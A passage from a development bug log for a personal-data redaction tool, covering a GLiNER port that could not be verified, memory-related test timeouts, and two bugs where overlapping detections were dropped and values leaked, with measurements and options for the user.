memory; (3) measure E's speed in context-sized calls.

**Guarded by:** nothing yet.

**Follow-up (2026-10-03):** fixed with the user's option 1. `isContextRefusal` (`eval/names/llm.ts`) recognises the refusal and E's speed check counts it as over the limit, so E runs on the names block only, as ADR-035 expected. Guarded by `llm.test.ts`, "isContextRefusal". Seen working in the resumed run (warm-up refused, recorded as over the limit).

## 56. The GLiNER port finds nothing in the model card's own example (2026-10-03, found in Phase 6a; not fixed, D excluded)

**Symptom:** after the 6a run, D found 1 of 109 names in the middle of a
sentence and 56 of the 153 main-case names that follow "My name is". The
user's check: run the port on the example GLiNER's model card publishes
with expected output. With the card's 14 labels and threshold (0.5, flat),
on the int8 model D was measured with, the port found none of the 6
expected entities and nothing else.

**Root cause:** not found; by the user's decision not investigated.
Either my port (`eval/names/gliner.ts` and the input tensors in
`scripts/compare-names.ts`, written from GLiNER.js without a reference
output to compare against, since Python is not installed) or the int8
export. Full precision was not tried (a 1.1 GB download) because it could
not rescue the int8 numbers.

**Fix:** none. D is "port unverified, results excluded" in ADR-035, the
README and every report; the decision was scored again without it (the
same). The decoder was generalised to several labels to run the check
(tested); the check is `--gliner-card`.

**Guarded by:** the check itself; nothing automatic.

## 57. Test runs time out when the machine runs short of memory, not because two suites run back to back (2026-10-03, investigated in Phase 6b; no code change)

**Symptom:** on 2026-10-03 two of four coverage runs failed, each the first
coverage run straight after a full `npm test`: at 10:31, five tests timed
out after about 151 s each (limit 30 s) and five workers failed to start;
at 11:17, one test (`detect.test.ts`, "never redacts only part of a
16-digit number…") timed out at 54.8 s. Both re-runs passed. The user
asked for it to be treated as a pattern: is it worker-pool or memory
exhaustion from two Vitest fleets back to back?

**Investigation:** a driver script ran three `npm test` → coverage pairs,
two coverage runs alone after 60 s idle, and two pairs with coverage
capped at 4 workers (`--maxWorkers=4`), one step after another, while a
sampler recorded every 2–4 s the machine's available memory, committed
memory, and the count, working set and private memory of every `node`
process (12 logical CPUs, 16 GB of RAM, commit limit 31.9 GB).

| Step                 | Exit | Duration | Timeouts | Lowest available | Highest committed | Node memory, all processes (working set) |
| -------------------- | ---- | -------- | -------- | ---------------- | ----------------- | ---------------------------------------- |
| pair 1 `npm test`    | 1    | 232 s    | 3        | 1,103 MB         | 26,410 MB         | 1,379 MB                                 |
| pair 1 coverage      | 1    | 184 s    | 4        | 955 MB           | 27,092 MB         | 1,367 MB                                 |
| pair 2 `npm test`    | 1    | 403 s    | 6        | 807 MB           | 26,803 MB         | 1,377 MB                                 |
| pair 2 coverage      | 1    | 222 s    | 4        | 750 MB           | 26,560 MB         | 1,389 MB                                 |
| pair 3 `npm test`    | 1    | 175 s    | 1        | 1,799 MB         | 24,866 MB         | 943 MB                                   |
| pair 3 coverage      | 0    | 78 s     | 0        | 3,573 MB         | 22,269 MB         | 1,451 MB                                 |
| coverage alone (1)   | 0    | 68 s     | 0        | 4,347 MB         | 21,939 MB         | 1,293 MB                                 |
| coverage alone (2)   | 0    | 59 s     | 0        | 3,828 MB         | 21,929 MB         | 1,288 MB                                 |
| capped 1 `npm test`  | 0    | 119 s    | 0        | 4,913 MB         | 21,849 MB         | 952 MB                                   |
| capped 1 coverage, 4 | 0    | 59 s     | 0        | 4,795 MB         | 21,111 MB         | 636 MB                                   |
| capped 2 `npm test`  | 0    | 97 s     | 0        | 4,391 MB         | 21,697 MB         | 1,347 MB                                 |
| capped 2 coverage, 4 | 0    | 57 s     | 0        | 4,865 MB         | 21,009 MB         | 638 MB                                   |

**Root cause (as far as the evidence goes):** the machine running short of
memory because of load **outside** the test run. Every step whose lowest
available memory was 1,799 MB or less failed, `npm test` alone included;
every step that stayed at 3,573 MB or more passed, coverage straight after
`npm test` included. Vitest's own memory was about the same in failing and
passing steps (at most 1.45 GB for all its processes), and committed memory
moved by about 6 GB on its own: above 26 GB at minutes when the `node`
processes held only 530–560 MB, then down to about 21 GB from 12:25 on.
During the failures the workers were mostly waiting, not computing (`node`
used 4 CPU-seconds out of 60 in a 5-second sample, with paging bursts of
900 pages per second), so heavy tests ran past the 30 s limit. What took
the memory was not recorded per process; the largest candidate is the WSL
virtual machine (4,934 MB private before the runs, 4,074 MB after), and the
rest is not attributed. Back-to-back fleets are not the cause: the
same sequence passed four times once memory was available.

**CI:** does not run them in sequence. The workflow runs
`npm run test:coverage` and then `npm run test:timing` as separate steps,
never a full `npm test` before coverage, on a 4-CPU runner with nothing
else on it.

**Fix:** none in code. The testing guide now says to check available
memory before a full gate and what the failures look like. Capping
coverage at 4 workers halves Vitest's memory (636–638 MB against
1,288–1,451 MB) at no measured cost in time (57–59 s against 59–78 s), but
both capped runs fell in the period with memory to spare, so they do not
show that it prevents the failure; offered to the user, not applied.

**Guarded by:** nothing automatic; a test cannot see the machine's memory.

**Follow-up (2026-10-03, the user's decision): the 4-worker cap is
applied, as a mitigation, not a proven fix.** `npm run test:coverage` now
runs `vitest run --coverage --project main --maxWorkers=4`
(`package.json`; a comment in `vitest.config.ts` points here). Reason: it
halves Vitest's memory (636–638 MB against 1,288–1,451 MB) at no measured
cost in time. It does not remove the cause, which is outside Vitest: if a
failure recurs under the cap, that is further evidence the cause is memory
taken by something else. `npm test` is unchanged (its main project still
uses up to 11 workers); CI's 4-CPU runner already used fewer than 4.

**Ollama checked and ruled out (same day).** The user suggested Ollama
keeping a model loaded (about 3 GB for `qwen3:4b`, kept for five minutes
after the last request by default) as the source of the 6 GB swing.
`ollama ps` showed nothing loaded; the Ollama server process held 56 MB;
and Ollama's own server log has no model load and no chat or generate
request between 10:42 and 12:57 IST, which covers both failed coverage
runs (10:31, 11:17) and the whole 12:06–12:25 window. Its only entries in
that span are the Ollama app's version and model-list checks at 10:42, an
internal scheduling line at 12:27, and the `ollama ps` itself at 12:57.
The swing came from something else; still not attributed.

## 58. A value glued to a typed placeholder was sent whole (2026-10-03, found in Phase 6b step 3; pre-existing, names off too; not fixed, waiting for the user)

**Symptom:** a property test written for person names in step 3 (a name
in Greek letters, which nothing else in the text uses, must not reach the
output) failed. Replayed with the text masked, the failing input was a
typed placeholder, a combining mark, then an address: `[PAN_1]`, U+0301,
`@example.com`. The output kept the address. Probing at HEAD, before any
step 3 change, with names off (digits masked):

| Input                                         | Sent as                                   |
| --------------------------------------------- | ----------------------------------------- |
| `password: [PAN_1]xyzddd!`                    | `password: [LITERAL_1]xyzddd!`            |
| `api_key=abc[PAN_1]defddd`                    | `api_key=abc[LITERAL_1]defddd`            |
| `[PAN_1]dddddddddddd` (12 digits)             | `[LITERAL_1]dddddddddddd`                 |
| `[PAN_1]`, U+0301, `asha@example.com`         | `[LITERAL_1]`, U+0301, `asha@example.com` |
| `ddddddddd[PAN_1]` (9 digits; for comparison) | `[NUMBER_1][LITERAL_1]`                   |

**Root cause:** `redactMessage()` drops every detection that overlaps a
literal (ADR-002: the literal wins). That filter was believed unreachable
(mutation M9 survives; 0 of 139,986 probes reached it in Phase 2), because
no detector's pattern contains `[` or `]`. But detections are widened and
rounded after the pattern matches, and three of those steps reach into a
literal glued to a value, which the bracketed literal pattern allows (it
has no glue rule): the safety net joins digits across `[` and `]` and
takes the whole glued token (ADR-011, ADR-029), so `1]1234…` is one
NUMBER starting inside `PAN_1`; a keyword secret's value runs to the next
blank (ADR-022), over the literal; and an email's local part may start
with a combining mark (ADR-034's `LOCAL_CHAR` includes `\p{M}`), which is
in the same grapheme cluster as the literal's `]`, so rounding out to
clusters (`toOriginal`) starts the email on the `]`. The whole detection
is then dropped, and its value sent. M9 survived because the probes and
tests never put a value glued to a literal.

**Fix:** none yet. Fixing it changes what a names-off request sends (only
for inputs like the ones above), and step 3's brief says names off must
stay as it is, so the choice is the user's. Options: (1) a detection that
overlaps a literal keeps its parts outside the literal (cut, with
separators at the cut left as text, as `outsideLiterals` already does for
name spans), so nothing outside a literal is ever dropped; (2) a bracketed
literal glued to a letter, digit, mark or underscore is not a literal
(the bare forms' glue rule), so the value and the brackets are one
detection; (3) both.

**What step 3 does about it:** name spans are cut around literals before
detection (`outsideLiterals` in `redact.ts`), trimmed to a letter or digit
at each cut, so a name piece never reaches into a literal by itself.
A name can still be lost through this bug when another detection that
contains it overlaps a literal (a keyword secret over `Asha[PAN_1]x`).

**Tests:** the current behaviour is pinned in `redact-names.test.ts`
("known gap, bug-log 58"), so a fix shows up as a deliberate test change.
The names property that found it keeps literals away from other values
until the bug is fixed.

**Follow-up (same day): a second place with two behaviours, and the
options measured.** A name piece that only touches a literal, with a mark
at its edge, still rounded into the literal's cluster and was dropped, so
`redactMessage` now cuts a PERSON detection that overlaps a literal
instead of dropping it, while every other type is still dropped. Names on
and names off therefore behave differently here too; **like bug 59's
rule, this is to be unified when bug 58 is decided**, not left as it is.

The options, measured on scratch copies of `src/` and `eval/` (the
held-out file not copied; generated set only, through the same scoring
`npm run eval` uses):

| Option                                                                                                             | Generated-set counts moved                                                               | Existing tests that change                                                                      | Names-off output that changes (100,000 random texts, 40,624 with a literal) |
| ------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------- |
| 1: a detection that overlaps a literal is cut, never dropped                                                       | **0** (scores and echo)                                                                  | only the five pinned bug-58 tests                                                               | 9,089 texts, each one where HEAD sends a value that the option redacts      |
| 2: a bracketed literal glued to a letter, digit, mark or `_` is not a literal (in the shared grammar, per ADR-002) | scores 0; **echo, shape `digit-beside`: 12 of 40 messages no longer restored correctly** | the pinned bug-58 tests, a literal test, both no-leak round trips and both streaming properties | not measured further: it breaks restoration                                 |
| 3: both                                                                                                            | as 2                                                                                     | as 2                                                                                            | as 2                                                                        |
| Bug 59's rule for every type with names off (decided with this)                                                    | **0**                                                                                    | only the pinned bug-59 test                                                                     | 1,215 texts, each one where HEAD drops a detection whole                    |

The published detection scores never saw this bug: `eval/score.ts` scores
`detect()`, which has no literal filter, so option 1 cannot move a score;
only the echo goes through `redactMessage`.

## 59. A detection that shared a character with its neighbour after rounding was dropped whole (2026-10-03, found in Phase 6b step 3; fixed with names on, pre-existing and pinned with names off)

**Symptom:** the step 3 property "every visible letter, digit and mark of
a name span lands inside a detection" failed. Replayed with the text
masked: a word, two Hangul compatibility jamo, U+FDFA, then an email, with
the name span from inside the word to just past U+FDFA. With the span,
`detect()` returned the email alone: the rest of the word and the jamo
would have been sent, though the name finder had found them.

**Root cause:** U+FDFA becomes 18 letters and spaces under NFKC, and the
email's local part starts inside them, so in the normalised text the name
and the email are neighbours that share no position (resolve.ts gives the
name the part the email does not cover). Mapped back to the original,
both round out to the whole U+FDFA character, and the last step of
`detect()`, `resolveOverlaps(mapped)`, keeps one of two overlapping
detections and drops the other whole. Its comment had foreseen the
overlap ("rounding out to whole clusters could, in principle, make two
neighbours share a character") but not that dropping a loser sends it.

**The same clash without a name (found the same day, by the same
property):** a test card, `-`, `½`, then an email. The card is widened
over `½`'s first digit and the email's local part is its second, so both
round out to `½`, and the email is dropped whole. With names off,
`4111 1111 1111 1111-½@example.com` is sent as `[CARD_1]@example.com`:
part of the address reaches the provider. A name can be lost the same way
in a clash it is not part of, when its letters went to the loser.

**Fix:** `resolveRounded` in `detect.ts`, on the names-on path only: when
`detect()` is given names, the loser of every such clash, whatever its
type, keeps its parts outside the winners. With names off `detect()` runs
the plain rule as before, so names-off output is unchanged (the whole suite
and `npm run eval` match). A first version cut only clashes with a
PERSON in them; the card-and-email case showed that was not enough.

**Two behaviours in one function, on purpose and for now:** names on cuts,
names off drops. **They must be unified when bug 58 is decided** (the same
family: a detection dropped whole, its value sent), so that the names-off
rule does not settle in as permanent. Until then the names-off case is
pinned.

**Tests:** the property above (3,000 runs), and exact cases in
`redact-names.test.ts`: "a name and an email that share U+FDFA", and the
card-and-email case, names on and names off (pinned).
